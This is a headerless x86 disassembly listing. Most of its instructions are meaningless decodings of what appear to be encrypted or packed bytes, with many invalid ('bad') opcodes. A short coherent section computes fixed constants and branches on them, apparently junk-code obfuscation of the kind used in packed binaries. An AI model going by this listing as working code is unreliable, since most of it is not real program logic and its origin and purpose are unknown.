  41bf0e:	shl    BYTE PTR [edi+0x12f089b0],1
  41bf14:	jns    0x41bf12
  41bf16:	mov    WORD PTR [ebp+0x7d6986e2],fs
  41bf1c:	rol    BYTE PTR [edx-0x14],1
  41bf1f:	xor    al,BYTE PTR [edx-0xa]
  41bf22:	outs   dx,DWORD PTR ds:[esi]
  41bf23:	sbb    al,ah
  41bf25:	add    DWORD PTR [edi],edi
  41bf27:	push   edi
  41bf28:	aas    
  41bf29:	bound  ebp,QWORD PTR [edx+eax*4]
  41bf2c:	jo     0x41bf98
  41bf2e:	jle    0x41bf13
  41bf30:	pop    ecx
  41bf31:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41bf32:	out    0xb5,eax
  41bf34:	jbe    0x41bf48
  41bf36:	mov    ebp,0x74f411b0
  41bf3b:	push   ecx
  41bf3c:	ret    
  41bf3d:	jne    0x41bf38
  41bf3f:	add    cl,BYTE PTR [eax+0x56]
  41bf42:	sub    ch,ch
  41bf44:	jne    0x41bf89
  41bf46:	fisubr DWORD PTR [ebx+0x4bf0c42]
  41bf4c:	loopne 0x41bf57
  41bf4e:	mov    ah,BYTE PTR [edi+0x58]
  41bf51:	ficomp WORD PTR [edx]
  41bf53:	dec    eax
  41bf54:	pop    esp
  41bf55:	(bad)
  41bf59:	sbb    DWORD PTR [ebx-0xd],0x221daf5e
  41bf60:	mov    edx,esi
  41bf62:	and    ebx,ecx
  41bf64:	push   esp
  41bf65:	and    eax,0xf54ea102
  41bf6a:	cs sti 
  41bf6c:	ins    BYTE PTR es:[edi],dx
  41bf6d:	mov    bh,0xed
  41bf6f:	add    BYTE PTR [edx],ah
  41bf71:	sub    BYTE PTR [ebp+0x43],bl
  41bf74:	nop
  41bf75:	pop    ebx
  41bf76:	rol    DWORD PTR [ebp+0x29c3ae45],0xfa
  41bf7d:	or     DWORD PTR [eax+0x221aa821],edi
  41bf83:	ret    0x13b0
  41bf86:	xlat   BYTE PTR ds:[ebx]
  41bf87:	arpl   WORD PTR ds:0x41675f85,cx
  41bf8d:	in     eax,0xfc
  41bf8f:	and    al,0x6
  41bf91:	sahf   
  41bf92:	jl     0x41bfbd
  41bf94:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41bf95:	or     ebx,DWORD PTR [ebp+0x49db0446]
  41bf9b:	pop    esi
  41bf9c:	push   edi
  41bf9d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41bf9e:	xchg   edi,eax
  41bf9f:	xor    edi,DWORD PTR [esi-0x7]
  41bfa2:	je     0x41bffc
  41bfa4:	xlat   BYTE PTR ds:[ebx]
  41bfa5:	sub    BYTE PTR [edx-0x22],ah
  41bfa8:	sbb    al,0x8b
  41bfaa:	xor    al,0x3c
  41bfac:	pop    edi
  41bfad:	retf   
  41bfae:	pop    ds
  41bfaf:	and    al,0x5a
  41bfb1:	jns    0x41c007
  41bfb3:	mov    bh,0xb8
  41bfb5:	sbb    cl,BYTE PTR [esi+0x3e]
  41bfb8:	pop    ecx
  41bfb9:	sbb    eax,0x3d0fab81
  41bfbe:	jno    0x41bf79
  41bfc0:	aam    0x57
  41bfc2:	add    BYTE PTR [eax],al
  41bfc4:	mov    WORD PTR [esp+0x2c],cx
  41bfc9:	mov    ecx,0x3b21
  41bfce:	mov    WORD PTR [esp+0x38],cx
  41bfd3:	mov    ecx,0x52fd
  41bfd8:	mov    WORD PTR [esp+0x24],cx
  41bfdd:	mov    ecx,0x2ce0
  41bfe2:	mov    WORD PTR [esp+0xc],cx
  41bfe7:	mov    cx,WORD PTR [esp+0xc]
  41bfec:	mov    dx,WORD PTR [esp+0x24]
  41bff1:	or     cx,dx
  41bff4:	mov    edx,0x21a4
  41bff9:	or     cx,dx
  41bffc:	mov    dx,WORD PTR [esp+0x2c]
  41c001:	sub    cx,dx
  41c004:	mov    dx,WORD PTR [esp+0x38]
  41c009:	sub    cx,dx
  41c00c:	mov    dx,WORD PTR [esp+0x3c]
  41c011:	cmp    dx,cx
  41c014:	jbe    0x41c888
  41c01a:	mov    ecx,0x5008
  41c01f:	mov    WORD PTR [esp+0x24],cx
  41c024:	mov    ecx,0x60ce
  41c029:	mov    WORD PTR [esp+0xc],cx
  41c02e:	movzx  ecx,WORD PTR [esp+0xc]
  41c033:	mov    edx,0x2095
  41c038:	or     cx,dx
  41c03b:	mov    dx,WORD PTR [esp+0x24]
  41c040:	sub    cx,dx
  41c043:	mov    edx,0x10de
  41c048:	or     ecx,0x742f
  41c04e:	imul   ecx,ecx,0x30b2
  41c054:	mov    WORD PTR [esp+0x3c],cx
  41c059:	mov    ecx,0x6143
  41c05e:	mov    WORD PTR [esp+0x38],cx
  41c063:	mov    ecx,0x679f
  41c068:	mov    WORD PTR [esp+0x2c],cx
  41c06d:	mov    ecx,0x1210
  41c072:	mov    WORD PTR [esp+0x24],cx
  41c077:	mov    ecx,0x3308
  41c07c:	mov    WORD PTR [esp+0xc],cx
  41c081:	mov    cx,WORD PTR [esp+0xc]
  41c086:	sub    cx,dx
  41c089:	mov    dx,WORD PTR [esp+0x24]
  41c08e:	xor    cx,dx
  41c091:	mov    dx,WORD PTR [esp+0x2c]
  41c096:	imul   cx,dx
  41c09a:	mov    dx,WORD PTR [esp+0x38]
  41c09f:	and    cx,dx
  41c0a2:	mov    edx,0x694c
  41c0a7:	and    cx,dx
  41c0aa:	mov    dx,WORD PTR [esp+0x3c]
  41c0af:	cmp    dx,cx
  41c0b2:	ja     0x41c888
  41c0b8:	mov    ecx,DWORD PTR [esp+0x18]
  41c0bc:	mov    edx,DWORD PTR [esp+0x1c]
  41c0c0:	shrd   ecx,edx,0x2
  41c0c4:	xor    ecx,eax
  41c0c6:	mov    eax,DWORD PTR [esp+0x18]
  41c0ca:	shr    edx,0x2
  41c0cd:	mov    edx,DWORD PTR [esp+0x1c]
  41c0d1:	xor    edx,edx
  41c0d3:	or     edx,ecx
  41c0d5:	push   edx
  41c0d6:	push   esi
  41c0d7:	shl    eax,0x1e
  41c0da:	push   edi
  41c0db:	lea    eax,[esp+0x7c]
  41c0df:	push   eax
  41c0e0:	lea    eax,[esp+0x28]
  41c0e4:	push   eax
  41c0e5:	jmp    0x41c4b4
  41c0ea:	in     eax,0x66
  41c0ec:	sar    BYTE PTR [ebx],1
  41c0ee:	dec    edx
  41c0ef:	sbb    esp,DWORD PTR [edx+0x1e]
  41c0f2:	icebp  
  41c0f3:	scas   eax,DWORD PTR es:[edi]
  41c0f4:	mov    ch,0x7c
  41c0f6:	inc    eax
  41c0f7:	imul   ecx,DWORD PTR [esi],0x1679a77e
  41c0fd:	sbb    BYTE PTR [edx+edx*1+0x1edf1818],bh
  41c104:	repnz stc 
  41c106:	(bad)  
  41c107:	out    dx,eax
  41c108:	loope  0x41c15f
  41c10a:	ss in  al,0xcd
  41c10d:	mov    ds:0xd6230cc5,eax
  41c112:	mov    ah,BYTE PTR [esi+eax*8-0x32d6b5]
  41c119:	adc    cl,BYTE PTR [ebx]
  41c11b:	hlt    
  41c11c:	mov    dh,0x66
  41c11e:	jne    0x41c131
  41c120:	(bad)  
  41c121:	icebp  
  41c122:	pop    esi
  41c123:	jmp    0x379798c1
  41c128:	shl    BYTE PTR [edi+0x7d],1
  41c12b:	push   esi
  41c12c:	push   cs
  41c12d:	and    al,0xa8
  41c12f:	pusha  
  41c130:	lahf   
  41c131:	mov    ds:0x3a66b86e,eax
  41c136:	jae    0x41c0fc
  41c138:	clc    
  41c139:	popf   
  41c13a:	cmp    edx,esi
  41c13c:	push   ebp
  41c13d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41c13e:	retf   0xc9d6
  41c141:	or     bh,bl
  41c143:	outs   dx,BYTE PTR ds:[esi]
  41c144:	cmc    
  41c145:	jecxz  0x41c150
  41c147:	call   FWORD PTR [esi]
  41c149:	xor    BYTE PTR [ebx-0x17],al
  41c14c:	and    BYTE PTR ds:0x3cc9a052,ch
  41c152:	ins    DWORD PTR es:[edi],dx
  41c153:	fld    TBYTE PTR [ebp-0x44]
  41c156:	(bad)  
  41c158:	and    DWORD PTR [eax],esp
  41c15a:	test   DWORD PTR [edi],esi
  41c15c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41c15d:	mov    esi,0xd126731a
  41c162:	sahf   
  41c163:	mov    esi,0x6f3a993e
  41c168:	mov    ah,0xab
  41c16a:	gs sbb eax,0xe531099c
  41c170:	clc    
  41c171:	je     0x41c1c7
  41c173:	cdq    
  41c174:	mov    ds:0x1de3c661,eax
  41c179:	sbb    al,0xdb
  41c17b:	je     0x41c1ac
  41c17d:	push   ebx
  41c17e:	pop    eax
  41c17f:	push   esi
  41c180:	loope  0x41c1b9
  41c182:	xchg   bx,ax
  41c184:	inc    ebp
  41c185:	cmp    eax,0x2f71c13
  41c18a:	xchg   BYTE PTR [ecx+ebx*2+0x204879a4],dl
  41c191:	and    BYTE PTR [ebx+0x43],bl
  41c194:	inc    eax
  41c195:	or     al,0xf3
  41c197:	dec    esi
  41c198:	loope  0x41c128
  41c19a:	jae    0x41c17a
  41c19c:	call   0x1683:0x3842d211
  41c1a3:	adc    ebx,esi
  41c1a5:	jo     0x41c14e
  41c1a7:	popf   
  41c1a8:	cwd    
  41c1aa:	mov    ecx,0x9a81fa17
  41c1af:	rol    DWORD PTR [edi+esi*8+0x28],cl
  41c1b3:	addr16 push 0xe59077c8
  41c1b9:	inc    esi
  41c1ba:	and    ch,BYTE PTR [edi-0x4af943bd]
  41c1c0:	jp     0x41c150
  41c1c2:	leave  
  41c1c3:	(bad)  
  41c1c4:	jno    0x41c15f
  41c1c6:	inc    edx
  41c1c7:	dec    edi
  41c1c8:	ins    DWORD PTR es:[edi],dx
  41c1c9:	pushf  
  41c1ca:	ins    BYTE PTR es:[edi],dx
  41c1cb:	push   edx
  41c1cc:	push   edi
  41c1cd:	jmp    0x41c1e7
  41c1cf:	mov    dh,0x68
  41c1d1:	ins    BYTE PTR es:[edi],dx
  41c1d2:	sahf   
  41c1d3:	out    dx,eax
  41c1d4:	out    0xb0,al
  41c1d6:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41c1d7:	pop    esi
  41c1d8:	(bad)  
  41c1d9:	leave  
  41c1da:	adc    ecx,DWORD PTR [esi+ebx*2]
  41c1dd:	push   eax
  41c1de:	mov    ds:0x11a6f543,eax
  41c1e3:	fidivr DWORD PTR [esi+0x315b86a7]
  41c1e9:	adc    edx,DWORD PTR [ecx]
  41c1eb:	mov    dh,0xfe
  41c1ed:	mov    eax,0xab98fbb2
  41c1f2:	jns    0x41c24a
  41c1f4:	daa    
  41c1f5:	scas   eax,DWORD PTR es:[edi]
  41c1f6:	aaa    
  41c1f7:	lods   eax,DWORD PTR ds:[esi]
  41c1f8:	xchg   edi,eax
  41c1f9:	push   eax
  41c1fa:	rcl    DWORD PTR [edx+0x7f75602],0x9d
  41c201:	data16 fsub QWORD PTR [edx+0x61]
  41c205:	fst    QWORD PTR [ecx+ecx*8]
  41c208:	test   DWORD PTR [edi+0xe],eax
  41c20b:	pop    edx
  41c20c:	(bad)  
  41c20d:	xchg   ebx,eax
  41c20e:	sub    al,BYTE PTR [edi+0x3b2a2c31]
  41c214:	pusha  
  41c215:	gs inc edx
  41c217:	mov    dl,bh
  41c219:	sub    esi,ebx
  41c21b:	in     al,dx
  41c21c:	and    eax,0x4ec94e4d
  41c221:	xor    eax,0xcaa7586f
  41c226:	daa    
  41c227:	es inc ecx
  41c229:	shl    cl,0x21
  41c22c:	pop    esi
  41c22d:	hlt    
  41c22e:	jo     0x41c279
  41c230:	rol    eax,0xa6
  41c233:	add    dl,BYTE PTR [ecx]
  41c235:	cmp    eax,0x2e77283b
  41c23a:	(bad)  
  41c23b:	test   edx,0x431ff05c
  41c241:	out    0x53,eax
  41c243:	push   eax
  41c244:	mov    bh,0x41
  41c246:	lock pop ebx
  41c248:	sub    DWORD PTR [esi-0x77],ebp
  41c24b:	jae    0x41c1e3
  41c24d:	mov    ebp,0xd2105227
  41c252:	and    al,0x9a
  41c254:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41c255:	loope  0x41c1fd
  41c257:	xchg   DWORD PTR [ebp-0x22],eax
  41c25a:	cld    
  41c25b:	je     0x41c2d0
  41c25d:	call   0xcddc:0x6b56ecc9
  41c264:	adc    DWORD PTR [ebp-0x26],esi
  41c267:	mov    esi,?
  41c269:	adc    al,0xab
  41c26b:	sbb    al,0xdf
  41c26d:	ins    BYTE PTR es:[edi],dx
  41c26e:	add    eax,0x6f9cade0
  41c273:	inc    eax
  41c274:	adc    ebp,DWORD PTR [eax-0x5cede5f0]
  41c27a:	and    edx,esp
  41c27c:	shr    DWORD PTR [ebx-0x403373e4],0xea
  41c283:	lock pop ds
  41c285:	cld    
  41c286:	mov    ss,WORD PTR [ecx]
  41c288:	test   ebx,0x9ba089bb
  41c28e:	scas   al,BYTE PTR es:[edi]
  41c28f:	or     BYTE PTR [eax],0x34
  41c292:	fs test al,0x35
  41c295:	add    BYTE PTR [ecx-0x55655bc1],ch
  41c29b:	mov    ebx,0x515fc535
  41c2a0:	sbb    al,0xd2
  41c2a2:	test   DWORD PTR [esi+0x2],esi
  41c2a5:	lds    ebx,FWORD PTR [ecx+0x47af2765]
  41c2ab:	or     al,BYTE PTR [ebp-0x23816726]
  41c2b1:	xchg   DWORD PTR [ecx],edi
  41c2b3:	dec    BYTE PTR [edx-0x53716c1b]
  41c2b9:	iret   
  41c2ba:	cmp    bl,cl
  41c2bc:	aam    0x12
  41c2be:	in     eax,0x9c
  41c2c0:	mov    ds:0xc323ca86,al
  41c2c5:	adc    al,0x7d
  41c2c7:	div    DWORD PTR [esi+0x5c]
  41c2ca:	xlat   BYTE PTR ds:[ebx]
  41c2cb:	add    bl,bh
  41c2cd:	hlt    
  41c2ce:	pop    esi
  41c2cf:	icebp  
  41c2d0:	adc    DWORD PTR [edi],ebx
  41c2d2:	pop    ebp
  41c2d3:	mov    dh,0xb7
  41c2d5:	or     eax,0x46ea459a
  41c2da:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41c2db:	(bad)  
  41c2dc:	sahf   
  41c2dd:	inc    ebp
  41c2de:	imul   ebx,DWORD PTR [esp+edx*4-0x1055f2c5],0x5e5371f
  41c2e9:	test   al,0x63
  41c2eb:	ficom  DWORD PTR [edi]
  41c2ed:	mov    al,ds:0x1d783150
  41c2f2:	cmp    edx,DWORD PTR [edi+0x12]
  41c2f5:	add    esp,edi
  41c2f7:	popf   
  41c2f8:	ja     0x41c2f3
  41c2fa:	mov    edi,0xd6843de0
  41c2ff:	rol    DWORD PTR [ebp-0x2a60aa3e],0xb3
  41c306:	inc    edx
  41c307:	xorps  xmm7,XMMWORD PTR ds:0xa7793816
  41c30e:	retf   0xcf73
  41c311:	ss add edi,ecx
  41c314:	scas   eax,DWORD PTR es:[edi]
  41c315:	xlat   BYTE PTR ds:[ebx]
  41c316:	sbb    DWORD PTR [ebx+0x14f882],esi
  41c31c:	inc    esp
  41c31d:	sti    
  41c31e:	dec    edx
  41c31f:	in     al,0xb4
  41c321:	push   eax
  41c322:	sub    ch,al
  41c324:	cmc    
  41c325:	mov    eax,ds:0xaa31a631
  41c32a:	lods   al,BYTE PTR ds:[esi]
  41c32b:	push   0xffffffda
  41c32d:	nop
  41c32e:	call   edx
  41c330:	xor    eax,0x92a09c5f
  41c335:	mov    BYTE PTR [esi-0x6c9e2ba7],bh
  41c33b:	hlt    
  41c33c:	mov    eax,ds:0x887bc60d
  41c341:	in     eax,dx
  41c342:	test   al,0xf8
  41c344:	lds    esp,FWORD PTR [ebp+0x5660246f]
  41c34a:	rcr    DWORD PTR [ecx-0x63],1
  41c34d:	test   eax,0x28fa7d0a
  41c352:	mov    edx,0xf13830e3
  41c357:	shl    DWORD PTR [esi+0x5eababbf],cl
  41c35d:	sbb    al,0x6a
  41c35f:	dec    esp
  41c360:	cmp    eax,0xf9cd8d26
  41c365:	jecxz  0x41c3c4
  41c367:	jmp    0x1d9afe3f
  41c36c:	mov    ebx,0xae9307f8
  41c371:	push   ebp
  41c372:	imul   esp,DWORD PTR [eax-0x4cc2d1df],0xec72e25b
  41c37c:	sbb    esi,edx
  41c37e:	int    0xec
  41c380:	mov    edi,0xf57ff55e
  41c385:	push   0xf1d95644
  41c38a:	popa   
  41c38b:	push   es
  41c38c:	les    esp,FWORD PTR [edi-0x601606b3]
  41c392:	dec    ecx
  41c393:	in     al,0x35
  41c395:	cmc    
  41c396:	shr    BYTE PTR [ebx],0xc
  41c399:	scas   eax,DWORD PTR es:[edi]
  41c39a:	and    ebx,esp
  41c39c:	int3   
  41c39d:	in     eax,dx
  41c39e:	add    BYTE PTR [esi],dl
  41c3a0:	out    dx,al
  41c3a1:	rcl    DWORD PTR [ecx+eax*4-0x55c501b],1
  41c3a8:	repnz xchg esp,eax
  41c3aa:	cwde   
  41c3ab:	pushf  
  41c3ac:	rcr    al,1
  41c3ae:	xlat   BYTE PTR ds:[ebx]
  41c3af:	xchg   BYTE PTR [ebp+0x6bf53eab],al
  41c3b5:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41c3b6:	leave  
  41c3b7:	push   ebx
  41c3b8:	fnsave [eax-0x148ae8c]
  41c3be:	inc    ebp
  41c3bf:	aad    0x4f
  41c3c1:	pusha  
  41c3c2:	outs   dx,BYTE PTR ds:[esi]
  41c3c3:	mov    BYTE PTR [ebx-0x2e],bh
  41c3c6:	pop    edi
  41c3c7:	mov    ebx,edx
  41c3c9:	sbb    ebx,ebx
  41c3cb:	test   DWORD PTR [edi+eiz*1-0x2b03a3c1],0xa4e203c8
  41c3d6:	ss mov bh,0x6
  41c3d9:	jae    0x41c3a9
  41c3db:	popf   
  41c3dc:	pop    esp
  41c3dd:	sub    esp,ebp
  41c3df:	pop    edx
  41c3e0:	ss stc 
  41c3e2:	popf   
  41c3e3:	inc    edx
  41c3e4:	out    dx,eax
  41c3e5:	mov    DWORD PTR [ecx+ecx*4-0x24],eax
  41c3e9:	inc    ebp
  41c3ea:	cwde   
  41c3eb:	(bad)  
  41c3ed:	xor    al,0xeb
  41c3ef:	cli    
  41c3f0:	ret    0xc8b8
  41c3f3:	iret   
  41c3f4:	jp     0x41c3a3
  41c3f6:	inc    ebp
  41c3f7:	mov    ss,WORD PTR [ecx-0x5e]
  41c3fa:	scas   al,BYTE PTR es:[edi]
  41c3fb:	inc    ebx
  41c3fc:	outs   dx,BYTE PTR ds:[esi]
  41c3fd:	add    esp,ebp
  41c3ff:	adc    ecx,DWORD PTR [ebp+0x7a452c65]
  41c405:	popa   
  41c406:	inc    ebp
  41c407:	xchg   DWORD PTR ds:0x70a97871,esp
  41c40d:	int3   
  41c40e:	addr16 push edx
  41c410:	add    DWORD PTR [ecx+0x34],edx
  41c413:	mov    al,ds:0x66648461
  41c418:	xor    DWORD PTR [esi+0x71],0x630d9543
  41c41f:	dec    ebx
  41c420:	or     esi,DWORD PTR [edi-0x7e1efbbc]
  41c426:	and    BYTE PTR [edx+0x2ae75eb0],cl
  41c42c:	out    dx,al
  41c42d:	scas   eax,DWORD PTR es:[edi]
  41c42e:	clc    
  41c42f:	lods   eax,DWORD PTR ds:[esi]
  41c430:	jno    0x41c4a6
  41c432:	xchg   DWORD PTR [edi],ebx
  41c434:	mov    DWORD PTR [edx-0x117220ff],esi
  41c43a:	lods   al,BYTE PTR ds:[esi]
  41c43b:	pop    esp
  41c43c:	(bad)  
  41c43d:	(bad)  
  41c43e:	bound  esi,QWORD PTR [edx]
  41c440:	scas   al,BYTE PTR es:[edi]
  41c441:	sub    eax,0x7a75632e
  41c446:	hlt    
  41c447:	out    0x67,al
  41c449:	cdq    
  41c44a:	out    dx,al
  41c44b:	out    0x35,eax
  41c44d:	inc    edi
  41c44e:	mov    esp,0xa3bfe7e4
  41c453:	arpl   WORD PTR [ebx],si
  41c455:	adc    ch,ch
  41c457:	or     eax,0x668f14f5
  41c45c:	les    esp,FWORD PTR [ebx-0x73]
  41c45f:	push   0x6b
  41c461:	stc    
  41c462:	jo     0x41c3ed
  41c464:	sbb    cl,BYTE PTR [esi-0x360b1aa5]
  41c46a:	jns    0x41c494
  41c46c:	pop    es
  41c46d:	xrelease mov BYTE PTR [ebp-0x48ca11f8],bl
  41c474:	sub    eax,0xa50fde2f
  41c479:	aam    0x2c
  41c47b:	clc    
  41c47c:	les    eax,FWORD PTR [eax+0x639527d]
  41c482:	adc    BYTE PTR [eax],0x2d
  41c485:	sub    eax,0x568e52dc
  41c48a:	jle    0x41c47d
  41c48c:	adc    ecx,DWORD PTR [eax-0xe0eafb0]
  41c492:	add    al,0x9a
  41c494:	add    BYTE PTR [ecx-0x5a],al
  41c497:	push   esp
  41c498:	cmp    eax,0xae040a70
  41c49d:	and    eax,0x7e3366de
  41c4a2:	jns    0x41c462
  41c4a4:	xchg   edi,eax
  41c4a5:	push   ss
  41c4a6:	adc    eax,0xdb7f2578
  41c4ab:	gs das 
  41c4ad:	ins    BYTE PTR es:[edi],dx
  41c4ae:	or     esp,DWORD PTR [ebx-0x29]
  41c4b1:	jns    0x41c51a
  41c4b3:	es call 0x414dd5
  41c4b9:	jmp    0x41c888
  41c4be:	inc    edi
  41c4bf:	and    edi,DWORD PTR [eax]
  41c4c1:	sbb    DWORD PTR [ebx+eax*1],esi
  41c4c4:	daa    
  41c4c5:	and    cl,BYTE PTR [ebx]
  41c4c7:	cdq    
  41c4c8:	lahf   
  41c4c9:	jo     0x41c46c
  41c4cb:	lock mov ebp,0x16734ab0
  41c4d1:	sbb    BYTE PTR [edx+edx*1+0x7c611818],bh
  41c4d8:	pushf  
  41c4d9:	xor    DWORD PTR [ebp+ebx*8+0x4a],edx
  41c4dd:	adc    ah,BYTE PTR [ecx]
  41c4df:	sar    DWORD PTR [ebx],cl
  41c4e1:	pop    ebx
  41c4e2:	sbb    eax,0x534d4a1a
  41c4e7:	dec    esi
  41c4e8:	stc    
  41c4e9:	test   DWORD PTR [edx+0x48],esp
  41c4ec:	test   al,0xd0
  41c4ee:	std    
  41c4ef:	adc    eax,0x4c9bf4d5
  41c4f4:	jg     0x41c4f5
  41c4f6:	push   ebx
  41c4f7:	sub    cl,BYTE PTR ds:0xb0a1ecad
  41c4fd:	mov    ecx,0xcd1f5658
  41c502:	push   ebp
  41c503:	fldcw  WORD PTR [ecx]
  41c505:	mov    dh,0x7d
  41c507:	(bad)  
  41c508:	fmul   st(7),st
  41c50a:	push   ebp
  41c50b:	icebp  
  41c50c:	mov    DWORD PTR [eax],esp
  41c50e:	lea    edx,[esi-0xd24a6c9]
  41c514:	in     al,dx
  41c515:	in     al,dx
  41c516:	jne    0x41c53b
  41c518:	inc    esp
  41c519:	pop    edi
  41c51a:	mov    cl,0x54
  41c51c:	mov    edx,0x370716ac
  41c521:	pop    ebp
  41c522:	das    
  41c523:	pusha  
  41c524:	ins    BYTE PTR es:[edi],dx
  41c525:	mov    edi,0x69fee93f
  41c52a:	js     0x41c4f7
  41c52c:	mov    DWORD PTR [ebp+ecx*1-0x5b3c39e0],ecx
  41c533:	stc    
  41c534:	push   esi
  41c535:	cmp    bh,BYTE PTR ss:[edx+0x1f6f19ba]
  41c53c:	leave  
  41c53d:	imul   edi,DWORD PTR [ecx+0x67a76f4a],0x10616286
  41c547:	aaa    
  41c548:	jne    0x41c4d5
  41c54a:	rcr    BYTE PTR ds:0xd56e569e,1
  41c550:	jl     0x41c5c3
  41c552:	xor    eax,esp
  41c554:	in     al,0x79
  41c556:	mov    ecx,esi
  41c558:	cmovl  ebx,ecx
  41c55b:	in     al,dx
  41c55c:	push   0x1
  41c55e:	mov    ah,ch
  41c560:	xor    cl,BYTE PTR [ebx-0x7d4a0518]
  41c566:	retf   
  41c567:	inc    ebx
  41c568:	sub    eax,0xae7db0fa
  41c56d:	mov    ch,0xc4
  41c56f:	sbb    eax,0x4c2fc93d
  41c574:	iret   
  41c575:	mov    cl,0xd3
  41c577:	jno    0x41c57a
  41c579:	and    eax,0x40994526
  41c57e:	(bad)
  41c581:	mov    ebx,0xb3a450d7
  41c586:	jle    0x41c557
  41c588:	cmp    al,0xcb
  41c58a:	retf   0x9229
  41c58d:	in     al,0x5
  41c58f:	xor    al,0x86
  41c591:	jmp    0x41c5d1
  41c593:	mov    ecx,0x3c35c418
  41c598:	xor    ebp,DWORD PTR [esi+eax*4-0x28]
  41c59c:	jns    0x41c606
  41c59e:	add    DWORD PTR [eax+eax*8+0x49],0x5
  41c5a3:	aas    
  41c5a4:	and    al,0xe3
  41c5a6:	into   
  41c5a7:	fwait
  41c5a8:	cmp    edi,ecx
  41c5aa:	xor    DWORD PTR [edi+0x7b42319a],ecx
  41c5b0:	pop    ebx
  41c5b1:	inc    esi
  41c5b2:	lds    edi,FWORD PTR [ecx-0x40]
  41c5b5:	int3   
  41c5b6:	cmc    
  41c5b7:	jmp    0x807c9c33
  41c5bc:	jecxz  0x41c5f2
  41c5be:	into   
  41c5bf:	mov    bl,0x40
  41c5c1:	and    BYTE PTR [ecx+0x1cd356cd],0x33
  41c5c8:	jl     0x41c592
  41c5ca:	inc    BYTE PTR [ebx+0x13]
  41c5cd:	xchg   esp,eax
  41c5ce:	xchg   esi,eax
  41c5cf:	in     al,dx
  41c5d0:	mov    BYTE PTR [edx+0x22],ch
  41c5d3:	add    BYTE PTR [eax+0x18],al
  41c5d6:	push   esi
  41c5d7:	pop    es
  41c5d8:	add    al,0x95
  41c5da:	dec    esp
  41c5db:	(bad)  
  41c5dc:	out    0xf9,eax
  41c5de:	adc    edi,DWORD PTR [edx+0x66]
  41c5e1:	cs mov al,0x2d
  41c5e4:	push   ebp
  41c5e5:	shr    DWORD PTR [ecx],1
  41c5e7:	cmp    cl,ah
  41c5e9:	xchg   esp,eax
  41c5ea:	mov    ah,0x1c
  41c5ec:	loopne 0x41c5e1
  41c5ee:	push   0xe
  41c5f0:	add    DWORD PTR [edx],ebx
  41c5f2:	xor    DWORD PTR [ebp-0x3661b1a2],ebp
  41c5f8:	(bad)
  41c5fb:	inc    edi
  41c5fc:	add    al,0x34
  41c5fe:	push   edi
  41c5ff:	sub    esp,ecx
  41c601:	dec    esi
  41c602:	dec    ecx
  41c603:	mov    cl,0x81
  41c605:	adc    al,0x9e
  41c607:	mov    eax,ds:0xe45e2cde
  41c60c:	test   dl,0xd8
  41c60f:	clc    
  41c610:	xchg   ecx,eax
  41c611:	dec    eax
  41c612:	fcomi  st,st(3)
  41c614:	pop    es
  41c615:	sti    
  41c616:	mov    esp,0xc3e8f53b
  41c61b:	test   BYTE PTR [esi+0x2ede7733],ah
  41c621:	js     0x41c63b
  41c623:	and    DWORD PTR [eax+0x30605c63],0x5bbf15d1
  41c62d:	sub    al,BYTE PTR [esi-0x4daf2f2b]
  41c633:	stos   BYTE PTR es:[edi],al
  41c634:	mov    ebp,0x2fb623ff
  41c639:	mov    al,0x31
  41c63b:	ja     0x41c60b
  41c63d:	xchg   edx,eax
  41c63e:	and    BYTE PTR [esi+0x48],cl
  41c641:	inc    ecx
  41c642:	add    al,0x5
  41c644:	mov    bl,0xf6
  41c646:	(bad)  [edx]
  41c648:	idiv   DWORD PTR [ecx-0x1c]
  41c64b:	retf   0xa405
  41c64e:	test   al,0x5c
  41c650:	icebp  
  41c651:	inc    eax
  41c652:	adc    edi,DWORD PTR [edx+0x6f]
  41c655:	cmp    al,BYTE PTR [ebx-0x46]
  41c658:	js     0x41c62a
  41c65a:	xchg   ecx,eax
  41c65b:	cmp    eax,0x182da09e
  41c660:	xor    bl,ah
  41c662:	dec    ebx
  41c663:	std    
  41c664:	push   ecx
  41c665:	dec    edi
  41c666:	xor    BYTE PTR [eax-0x7e],cl
  41c669:	jl     0x41c662
  41c66b:	push   0x2fb4358a
  41c670:	push   ebp
  41c671:	jge    0x41c6ed
  41c673:	jecxz  0x41c6ae
  41c675:	sub    BYTE PTR [ecx+0x1b],dl
  41c678:	mov    dl,0x7f
  41c67a:	fcmovne st,st(3)
  41c67c:	xor    eax,0x681362f1
  41c681:	inc    edi
  41c682:	xchg   ebp,eax
  41c683:	dec    edi
  41c684:	sti    
  41c685:	pop    edx
  41c686:	repnz int 0x64
  41c689:	add    eax,0xfcb47e61
  41c68e:	push   0xa10f5efd
  41c693:	in     al,dx
  41c694:	jnp    0x41c64e
  41c696:	push   ebx
  41c697:	pop    edx
  41c698:	out    dx,eax
  41c699:	outs   dx,DWORD PTR ds:[esi]
  41c69a:	lods   eax,DWORD PTR ds:[si]
  41c69c:	(bad)  
  41c69d:	cmp    eax,0xa0408652
  41c6a2:	xor    BYTE PTR [ebp-0x6d],ah
  41c6a5:	in     al,dx
  41c6a6:	mov    ch,0x4
  41c6a8:	dec    esi
  41c6a9:	pop    ds
  41c6aa:	xchg   edx,ebp
  41c6ac:	leave  
  41c6ad:	mov    edx,0x4b370593
  41c6b2:	aaa    
  41c6b3:	sbb    esp,DWORD PTR [eax]
  41c6b5:	fnsave [edi-0x20]
  41c6b8:	and    edx,DWORD PTR [bp+di+0x7b]
  41c6bc:	jbe    0x41c6ec
  41c6be:	pop    edx
  41c6bf:	inc    ebp
  41c6c0:	adc    DWORD PTR ds:0x55ad2d00,0xf366ef73
  41c6ca:	pop    edx
  41c6cb:	mov    WORD PTR [ebp+0x1e],es
  41c6ce:	xor    eax,edi
  41c6d0:	enter  0xe016,0x6c
  41c6d4:	mov    esp,0xb729f7f9
  41c6d9:	sub    cl,cl
  41c6db:	fimul  WORD PTR ds:0x8a7af71e
  41c6e1:	push   edi
  41c6e2:	inc    ebx
  41c6e3:	sbb    al,0x87
  41c6e5:	mov    ds:0x263d0d83,al
  41c6ea:	dec    edx
  41c6eb:	push   ss
